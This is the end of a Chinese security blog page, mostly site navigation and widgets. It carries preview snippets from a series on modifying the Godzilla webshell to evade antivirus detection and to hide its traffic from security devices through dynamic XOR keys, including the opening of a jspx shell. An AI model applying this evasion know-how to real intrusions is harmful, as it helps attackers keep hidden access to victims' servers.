下载好原版哥斯拉，然后拖到反编译网站，反编译完成后会看到一个压缩包，解压。   然后新建一个lib目录，将原版的godzilla拖进去，在将刚刚反编译后的目录拖到项目目录下  接着建立依赖关系。 settings-&gt;Project...</div></div></div></a><a class="pagination-related" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">哥斯拉二开从0到1-3(动态密钥)</div></div><div class="info-2"><div class="info-item-1">前言有小伙伴说，上面的文章都做了动态的免杀，每次生成的木马都不一样，还挺好的，还有没有什么东西可以做成动态的，我想了想，如果把我们的密钥做成动态的，那岂不是，简单的实现了动态加密。 前置知识首先我们来看，哥斯拉的加密传输过程  这里我们可以看到，有两个关键点，就是  pass和key pass就是传递的键，payload为值，payload是由key控制的，因为你每次需要发送的东西  都会进行异或一下。如果这里，我们把key设成动态的，那么也就是说，payload就会是动态的。当然，这不是重点，重点是，如果对方的安全设备上，捕获了我们的流量，他想解密我们在其中做了什么，那么就需要key解密，看图中的第八步，执行的结果需要xor才能获取值。好，如果我们的木马文件中，没有写key，或者把key写成动态的，如果他不知道key是什么，那么他就解不出来了我们做了什么了。当然，key是可以爆破的，就是比较麻烦了。 思路这里我们也可以想到，因为我们必须要传上去一个木马，木马中必定带key和pass，并且本地也需要知道这个key，去和服务端通信。如果客户端发送一个key ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a><a class="pagination-related" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-24</div><div class="info-item-2">哥斯拉二开从0到1-5(asmx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。 asmx简介ASMX 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web 服务，允许客户端与服务器进行远程交互，传输数据并执行方法。ASMX 文件通常包含服务的代码和定义，用来处理 Web 服务的请求和响应。 Web 服务（也叫做 XML Web Service）是一种能够接收来自互联网或局域网中其他系统的请求，提供轻量级通信的独立技术。Web 服务通过 SOAP 协议在 Web 上提供功能，通常由 WSDL 文件描述，并通过 UDDI 注册。  SOAP（简单对象访问协议）：它是 XML Web 服务的通信协议，定义了如何通过 HTTP 或其他底层协议来调用 Web 服务中的方法。SOAP 使用 XML 格式的消息进行通信。 WSDL（Web 服务描述语言）：一个 XML 文档，用于描述 Web 服务的操作以及如何交换数据。WSDL 文件通常由软件自动生成，并且可以通过 UDDI...</div></div></div></a><a class="pagination-related" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-22</div><div class="info-item-2">哥斯拉二开从0到1-4(流量优化)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-%E5%85%8D%E6%9D%80"><span class="toc-number">2.</span> <span class="toc-text">php 免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jsp-%E5%85%8D%E6%9D%80"><span class="toc-number">3.</span> <span class="toc-text">jsp 免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asp-%E5%85%8D%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text">asp 免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#aspx-%E5%85%8D%E6%9D%80"><span class="toc-number">5.</span> <span class="toc-text">aspx 免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E7%89%88%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">下个版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text">下载、使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">9.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="冰蝎二开从0到1"/></a><div class="content"><a class="title" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1">冰蝎二开从0到1</a><time datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const destroyWaline = ele => ele.destroy()

  const initWaline = (Fn, el = document, path = window.location.pathname) => {
    const waline = Fn({
      el: el.querySelector('#waline-wrap'),
      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      comment: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyWaline = () => {
        destroyWaline(waline)
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const loadWaline = (el, path) => {
    if (initFn) initWaline(initFn, el, path)
    else {
      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
        .then(({ init }) => {
          initFn = init || Waline.init
          initWaline(initFn, el, path)
          window.walineFn = initFn
        })
    }
  }

  if (isShuoshuo) {
    'Waline' === 'Waline'
      ? window.shuoshuoComment = { loadComment: loadWaline } 
      : window.loadOtherComment = loadWaline
    return
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: true,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
            var git_user ="Bohemiana";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>